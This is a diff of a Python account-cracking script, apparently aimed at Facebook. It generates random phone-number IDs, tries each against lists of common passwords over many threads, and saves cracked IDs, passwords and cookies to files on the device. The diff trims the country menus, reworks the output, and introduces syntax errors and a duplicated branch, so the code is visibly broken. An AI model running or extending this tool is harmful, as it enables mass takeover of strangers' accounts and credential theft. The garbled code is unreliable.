@@ -1005,7 +1005,7 @@ for xd in range(10000):
     k=random.randrange(40,150)
     l='Versi/4.0 Chrome/105.0.5195.136 Seluler Safari/537.36 WpsMoffice/16.6/arm64-v8a/1347'
     uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-    ugen.append(uaku2)
+    ugen.append(uaku2)sys.stdout.write('\r\33[1;37m[M4-HONEY] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
 
     aa='Mozilla/5.0 (Linux; Android 7.0;'
     b=random.choice(['7.0','8.1.0','9','10','11','12'])
@@ -1244,7 +1244,7 @@ def HONEY():
     os.system("clear")
     print(logo)
     print("\033[1;33m [💘]✼★━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━★✼")
-    print("\033[1;37m [1] NEPAL CLONING\n\033[1;36m [2] INDIA CLONING\n\033[1;33m [3] PAKISTAN CLONING \n\033[1;36m [4] BANGLADESH CLONING \n\033[1;37m [5] AFGHANISTAN CLONING \n")
+    print("\033[1;37m [1] INDIAN CLONING \n")
     print(49*'=')
     aryan = input("✓CHOOSE>")
     if aryan =='1':HONEY1()
@@ -1257,72 +1257,6 @@ def HONEY():
         HONEY()
 
 def HONEY1():
-	user=[]
-	os.system('clear')
-	print(logo)
-	print('\033[1;37m [😊] USE YOUR FOUR DIGIT OF SIM NUMBER  (*****)')
-	print(47*'-')
-	kode = input('\033[1;36m [🥀] CHOOSE CODE : ')
-	print(47*'-')
-	limit = int(input('\033[1;37m [🥳] LIMT [50000]: '))
-	for nmbr in range(limit):
-		nmp = ''.join(random.choice(string.digits) for _ in range(7))
-		user.append(nmp)
-	os.system("clear")
-	print(logo)
-	print("                CHOOSE METHOD                       ")
-	print("\033[1;37m [💚]-----------------------------------------------------------------------------------------") 
-	print("\033[1;36m [1] METHOD 1- MBASIC\n\033[1;33m [2] METHOD 2- P\n\033[1;36m [3] METHOD 3- X\n\033[1;35m [4] METHOD 4- MOBILE\n\033[1;92m [5] METHOD 5- FREE\n")
-	print(49*'=')
-	HONEYfire = input("\033[1;37m [+] [CHOOSE] :- ")
-	os.system("clear")
-	print(logo)
-	print("                TRY SOMETHING NEW                       ")
-	print("\033[1;37m [💚]-----------------------------------------------------------------------------------------") 
-	print("\033[1;36m [❣️] DO YOU WANNA SHOW COKKIE & APK OF OK IDZ (Y/N) :-  ")
-	print("\033[1;37m [🥀]-----------------------------------------------------------------------------------------") 
-	HONEYlovesyou = input("\033[1;36m[+] [CHOOSE] :- ")
-	if HONEYlovesyou in ['y','Y','1','yes','YES','Yes']:
-		HONEY_xd.append('y')
-	else:
-		HONEY_xd.append('n')
-	print("\033[1;37m [😊]-----------------------------------------------------------------------------------------") 
-	print("\033[1;36m [🥀] DO YOU WANNA SHOW CP IDZ (Y/N) :- ")
-	print("\033[1;37m [😊]-----------------------------------------------------------------------------------------") 
-	HONEYtop = input("\033[1;36m [❣️] [CHOOSE] :- ")
-	if HONEYtop in ['y','Y','Yes','YES','1']:
-		baby.append('y')
-	else:
-		baby.append('n')
-	with ThreadPool(max_workers=30) as yaari:
-		os.system('clear')
-		print(logo)
-		tl = str(len(user))
-		print(f"\033[1;37m [😊] TOTAL IDZ  : "+tl+" ")
-		print(f"\033[1;36m [💚] CODE CHOOSED : "+kode)
-		print(f'\033[1;37m [🥀] METHOD CHOOSED : M{HONEYfire}')
-		print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
-		for guru in user:
-			uid = kode+guru
-			pwx = [uid+guru,'nepal123','nepal12345','free fire','i love you','freefire123']
-			if HONEYfire =='1':yaari.submit(mbasic,uid,pwx,tl)
-			elif HONEYfire =='2':yaari.submit(p,uid,pwx,tl)
-			elif HONEYfire =='3':yaari.submit(x,uid,pwx,tl)
-			elif HONEYfire =='4':yaari.submit(mobile,uid,pwx,tl)
-			elif HONEYfire =='5':yaari.submit(free,uid,pwx,tl)
-			else:
-			    yaari.submit(p,uid,pwx,tl)
-			
-	print(47*"-")
-	print('[✓] CRACKING COMPLETED ')
-	print('[✓] OK/CP: '+str(len(oks))+'/'+str(len(cps)))
-	print('[?] Ids saved in HONEY.txt,HONEY-CP.txt')
-	input("DO YOU WANT TO GO BSCK MENU ")
-	HONEY()
-	print(47*"-")
-	
-
-def HONEY2():
 	user=[]
 	os.system('clear')
 	print(logo)
@@ -1379,6 +1313,7 @@ def HONEY2():
 			elif HONEYfire =='3':yaari.submit(x,uid,pwx,tl)
 			elif HONEYfire =='4':yaari.submit(mobile,uid,pwx,tl)
 			elif HONEYfire =='5':yaari.submit(free,uid,pwx,tl)
+			elif HONEYfire =='5':yaari.submit(alfa,uid,pwx,tl)
 			else:
 			    yaari.submit(p,uid,pwx,tl)
 			
@@ -1390,213 +1325,6 @@ def HONEY2():
 	HONEY()
 	print(47*"-")
 
-
-def HONEY3():
-	user=[]
-	os.system('clear')
-	print(logo)
-	print('\033[1;92m [•] USE YOUR FOUR DIGIT OF SIM NUMBER  93718, 93716,93180,')
-	kode = input('\033[1;36m [🥀] CHOOSE CODE : ')
-	print(47*'-')
-	limit = int(input('\033[1;37m [🥳] LIMT [50000]: '))
-	for nmbr in range(limit):
-		nmp = ''.join(random.choice(string.digits) for _ in range(6))
-		user.append(nmp)
-	os.system("clear")
-	print(logo)
-	print("                CHOOSE METHOD                       ")
-	print("\033[1;37m [💚]-----------------------------------------------------------------------------------------") 
-	print("\033[1;36m [1] METHOD 1- MBASIC\n\033[1;33m [2] METHOD 2- P\n\033[1;36m [3] METHOD 3- X\n\033[1;35m [4] METHOD 4- MOBILE\n\033[1;92m [5] METHOD 5- FREE\n")
-	print(49*'=')
-	HONEYfire = input("\033[1;37m [+] [CHOOSE] :- ")
-	os.system("clear")
-	print(logo)
-	print("                TRY SOMETHING NEW                       ")
-	print("\033[1;37m [💚]-----------------------------------------------------------------------------------------") 
-	print("\033[1;36m [❣️] DO YOU WANNA SHOW COKKIE & APK OF OK IDZ (Y/N) :-  ")
-	print("\033[1;37m [🥀]-----------------------------------------------------------------------------------------") 
-	HONEYlovesyou = input("\033[1;36m [+] [CHOOSE] :- ")
-	if HONEYlovesyou in ['y','Y','1','yes','YES','Yes']:
-		HONEY_xd.append('y')
-	else:
-		HONEY_xd.append('n')
-	print("\033[1;37m [😊]-----------------------------------------------------------------------------------------") 
-	print("\033[1;36m [🥀] DO YOU WANNA SHOW CP IDZ (Y/N) :- ")
-	print("\033[1;37m [😊]-----------------------------------------------------------------------------------------") 
-	HONEYtop = input("\033[1;36m [❣️] [CHOOSE] :- ")
-	if HONEYtop in ['y','Y','Yes','YES','1']:
-		baby.append('y')
-	else:
-		baby.append('n')
-	with ThreadPool(max_workers=30) as yaari:
-		os.system('clear')
-		print(logo)
-		tl = str(len(user))
-		print("\033[1;33m [💘]✼★━━━━━━━━━━━━━━━━━━━━━━━━━━━★✼")
-		print(f"\033[1;37m [😊] TOTAL IDZ  : "+tl+" ")
-		print(f"\033[1;36m [💚] CODE CHOOSED : "+kode)
-		print(f'\033[1;37m [🥀] METHOD CHOOSED : M{HONEYfire}')
-		print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
-		for guru in user:
-			uid = kode+guru
-			pwx = [kode+guru,mk,'5727200','59039200','57575751','khan123','khan1122','Free Fire','i love you','freefire123','free fire','khan12345']		
-			if HONEYfire =='1':yaari.submit(mbasic,uid,pwx,tl)
-			elif HONEYfire =='2':yaari.submit(p,uid,pwx,tl)
-			elif HONEYfire =='3':yaari.submit(x,uid,pwx,tl)
-			elif HONEYfire =='4':yaari.submit(mobile,uid,pwx,tl)
-			elif HONEYfire =='5':yaari.submit(free,uid,pwx,tl)
-			else:
-			    yaari.submit(p,uid,pwx,tl)
-			
-	print(47*"-")
-	print('[✓] CRACKING COMPLETED ')
-	print('[✓] OK/CP: '+str(len(oks))+'/'+str(len(cps)))
-	print('[?] Ids saved in HONEY.txt,HONEY-CP.txt')
-	input("DO YOU WANT TO GO BSCK MENU ")
-	HONEY()
-	print(47*"-")
-
-def HONEY4():
-	user=[]
-	os.system('clear')
-	print(logo)
-	print('[+] USE YOUR FOUR DIGIT OF SIM NUMBER  017,018,019')
-	print(47*'-')
-	kode = input('\033[1;36m [🥀] CHOOSE CODE : ')
-	print(47*'-')
-	limit = int(input('\033[1;37m [🥳] LIMT [50000]: '))
-	for nmbr in range(limit):
-		nmp = ''.join(random.choice(string.digits) for _ in range(6))
-		user.append(nmp)
-	os.system("clear")
-	print(logo)
-	print("                CHOOSE METHOD                       ")
-	print("\033[1;37m [💚]==============================================")
-	print("\033[1;36m [1] METHOD 1- MBASIC\n\033[1;33m [2] METHOD 2- P\n\033[1;36m [3] METHOD 3- X\n\033[1;35m [4] METHOD 4- MOBILE\n\033[1;92m [5] METHOD 5- FREE\n")
-	print(49*'=')
-	HONEYfire = input("\033[1;37m [+] [CHOOSE] :- ")
-	os.system("clear")
-	print(logo)
-	print("                TRY SOMETHING NEW                       ")
-	print("\033[1;37m [💚]-----------------------------------------------------------------------------------------") 
-	print("\033[1;36m [❣️] DO YOU WANNA SHOW COKKIE & APK OF OK IDZ (Y/N) :-  ")
-	print("\033[1;37m [🥀]-----------------------------------------------------------------------------------------═") 
-	HONEYlovesyou = input("\033[1;36m [+] [CHOOSE] :- ")
-	if HONEYlovesyou in ['y','Y','1','yes','YES','Yes']:
-		HONEY_xd.append('y')
-	else:
-		HONEY_xd.append('n')
-	print("\033[1;37m [😊]-----------------------------------------------------------------------------------------") 
-	print("\033[1;36m [🥀] DO YOU WANNA SHOW CP IDZ (Y/N) :- ")
-	print("\033[1;37m [😊]-----------------------------------------------------------------------------------------") 
-	HONEYtop = input("\033[1;36m [❣️] [CHOOSE] :- ")
-	if HONEYtop in ['y','Y','Yes','YES','1']:
-		baby.append('y')
-	else:
-		baby.append('n')
-	with ThreadPool(max_workers=30) as yaari:
-		os.system('clear')
-		print(logo)
-		tl = str(len(user))
-		print(f"\033[1;37m [😊] TOTAL IDZ  : "+tl+" ")
-		print(f"\033[1;36m [💚] CODE CHOOSED : "+kode)
-		print(f'\033[1;37m [🥀] METHOD CHOOSED : M{HONEYfire}')
-		print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
-		for guru in user:
-			uid = kode+guru
-			mk = uid[:6]
-			pwx = [guru]
-			pwx = [kode+guru,mk,'free fire','freefire','i love you','freefire123','5727200','59039200','57575751']
-			if HONEYfire =='1':yaari.submit(mbasic,uid,pwx,tl)
-			elif HONEYfire =='2':yaari.submit(p,uid,pwx,tl)
-			elif HONEYfire =='3':yaari.submit(x,uid,pwx,tl)
-			elif HONEYfire =='4':yaari.submit(mobile,uid,pwx,tl)
-			elif HONEYfire =='5':yaari.submit(fre,uid,pwx,tl)
-			else:
-			    yaari.submit(p,uid,pwx,tl)
-			
-	print(47*"-")
-	print('[✓] CRACKING COMPLETED ')
-	print('[✓] OK/CP: '+str(len(oks))+'/'+str(len(cps)))
-	print('[?] Ids saved in HONEY.txt,HONEY-CP.txt')
-	input("DO YOU WANT TO GO BSCK MENU ")
-	HONEY()
-	print(47*"-")
-
-def HONEY5():
-	user=[]
-	os.system('clear')
-	print(logo)
-	print('\033[1;92m [•]USE YOUR FOUR DIGIT OF SIM NUMBER  9278,9276,')
-	print(47*'-')
-	kode = input('\033[1;36m [🥀] CHOOSE CODE : ')
-	print(47*'-')
-	limit = int(input('\033[1;37m [🥳] LIMT [50000]: '))
-	for nmbr in range(limit):
-		nmp = ''.join(random.choice(string.digits) for _ in range(6))
-		user.append(nmp)
-	os.system("clear")
-	print(logo)
-	print("                CHOOSE METHOD                       ")
-	print("[+]════════════════════════════════════") 
-	print("\033[1;36m [1] METHOD 1- MBASIC\n\033[1;33m [2] METHOD 2- P\n\033[1;36m [3] METHOD 3- X\n\033[1;35m [4] METHOD 4- MOBILE\n\033[1;92m [5] METHOD 5- FREE\\033[1;92m [6] METHOD alfa\n")
-	print(49*'=')
-	HONEYfire = input("[+] [CHOOSE] :- ")
-	os.system("clear")
-	print(logo)
-	print("                CHOOSE METHOD                       ")
-	print("\033[1;37m [💚]════════════════════════════════════") 
-	print("\033[1;36m [1] METHOD 1- MBASIC\n\033[1;37m [2] METHOD 2- P\n\033[1;33m [3] METHOD 3- X\n\033[1;92m [4] METHOD 4- MOBILE\033[1;92m [5] METHOD 5- FREE\n\033[1;92m  [6] METHOD alfa\n")
-	print(49*'=')
-	HONEYfire = input("\033[1;37m [+] [CHOOSE] :- ")
-	os.system("clear")
-	print(logo)
-	print("                TRY SOMETHING NEW                       ")
-	print("\033[1;37m [💚]════════════════════════════════════") 
-	print("\033[1;36m [❣️] DO YOU WANNA SHOW COKKIE & APK OF OK IDZ (Y/N) :-  ")
-	print("\033[1;37m [🥀]════════════════════════════════════") 
-	HONEYlovesyou = input("\033[1;36m[+] [CHOOSE] :- ")
-	if HONEYlovesyou in ['y','Y','1','yes','YES','Yes']:
-		HONEY_xd.append('y')
-	else:
-		HONEY_xd.append('n')
-	print("\033[1;37m [😊]════════════════════════════════════") 
-	print("\033[1;36m [🥀] DO YOU WANNA SHOW CP IDZ (Y/N) :- ")
-	print("\033[1;37m [😊]════════════════════════════════════") 
-	HONEYtop = input("\033[1;36m [❣️] [CHOOSE] :- ")
-	if HONEYtop in ['y','Y','Yes','YES','1']:
-		baby.append('y')
-	else:
-		baby.append('n')
-	with ThreadPool(max_workers=30) as yaari:
-		os.system('clear')
-		print(logo)
-		tl = str(len(user))
-		print(f"\033[1;37m [😊] TOTAL IDZ  : "+tl+" ")
-		print(f"\033[1;36m [💚] CODE CHOOSED : "+kode)
-		print(f'\033[1;37m [🥀] METHOD CHOOSED : M{HONEYfire}')
-		print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
-		for guru in user:
-			uid = kode+guru
-			mk = uid[:6]
-			pwx = [guru]
-			pwx = [kode+guru,mk,'khankhan','khan123','khan1122','first last','first123','last786','khan786','khan12345,''first@123','first1122','musa123','mohammad123','firstlast1122','first987','first@1234','First Last','firstlast12345','firstlast786']
-			if HONEYfire =='1':yaari.submit(mbasic,uid,pwx,tl)
-			elif HONEYfire =='2':yaari.submit(p,uid,pwx,tl)
-			elif HONEYfire =='3':yaari.submit(x,uid,pwx,tl)
-			elif HONEYfire =='4':yaari.submit(mobile,uid,pwx,tl)
-			elif HONEYfire =='5':yaari.submit(fre,uid,pwx,tl)
-			elif HONRYfire =='6':yaari.submit(alfa,uid,pwx,tl)
-			else:
-			    yaari.submit(p,uid,pwx,tl)
-			
-	print(47*"-")
-	print('[✓] CRACKING COMPLETED ')
-	print('[✓] OK/CP: '+str(len(oks))+'/'+str(len(cps)))
-	print('[?] Ids saved in HONEY.txt,HONEY-CP.txt')
-	input("DO YOU WANT TO GO BSCK MENU ")
-	HONEY()
-	print(47*"-")
 
 
 
@@ -1963,24 +1691,24 @@ def alfa(alfa,uid,pwx,tl):
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[151:166]
 				print('\n')
-				print('\033[1;92m[SPY-OK] '+idf+' | '+ps+'\033[0;97m')
+				print('\033[1;92m[SPY-OK] '+cid+' | '+ps+'\033[0;97m')
 				cek_apk(coki)
-				open('ok.txt', 'a').write(idf+' | '+ps+'\n')
+				open('/sdcard/ok.txt', 'a').write(cid+' | '+ps+'\n')
 				oks.append(idf)
 				break
 			elif 'checkpoint' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[141:156]
 				print('\n')
-				print('\033[1;91m[SPY-CP] '+idf+' | '+ps+'\033[0;97m')
-				open('cp.txt', 'a').write(idf+' | '+ps+'\n')
+				print('\033[1;91m[SPY-CP] '+cid+' | '+ps+'\033[0;97m')
+				open('/sdcard/cp.txt', 'a').write(cid+' | '+ps+'\n')
 				cps.append(idf)
 				break
 			else:
 				continue
 		loop+=1
 		bo = random.choice([m,k,h,b,u,x])
-		sys.stdout.write(f'\r\r\033[1;37m [SPY1x1-VIP] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+		sys.stdout.write('\r\33[1;37m[M4-HONEY] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
 		sys.stdout.flush()
 	
 	except:
@@ -2066,7 +1794,7 @@ def free(uid,pwx,tl):
 			else:
 				continue
 		loop+=1
-		sys.stdout.write('\r\33[1;37m[M5-HONEY] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
+		sys.stdout.write('\r\33[1;37m[M-HONEY] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
 		sys.stdout.flush()
 	except:
 		pass
